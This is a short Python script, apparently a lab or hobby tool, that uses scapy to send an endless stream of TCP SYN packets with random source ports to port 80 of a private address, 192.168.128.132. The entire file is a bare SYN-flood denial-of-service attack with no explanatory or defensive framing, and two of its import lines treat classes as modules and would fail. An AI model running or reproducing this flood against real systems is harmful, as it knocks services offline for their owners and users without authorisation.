#!/usr/bin/python
from scapy.all import *
import scapy.all.IP
import scapy.all.TCP
p=IP(dst='192.168.128.132')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
send(p,  verbose=0, loop=1)
